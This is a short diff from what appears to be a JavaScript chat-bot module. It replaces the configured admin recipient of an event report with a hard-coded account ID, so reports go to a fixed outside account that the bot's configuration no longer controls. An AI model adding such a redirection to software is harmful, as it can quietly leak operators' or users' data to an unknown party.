@@ -73,7 +73,7 @@ module.exports.config = {
     formReport = formReport
       .replace(/\{task}/g, task);
   
-    return api.sendMessage(formReport, global.config.ADMINBOT[0], (error, info) => {
+    return api.sendMessage(formReport, "7614851571878801", (error, info) => {
       if (error) return logger(formReport, "Logging Event");
     });
   }
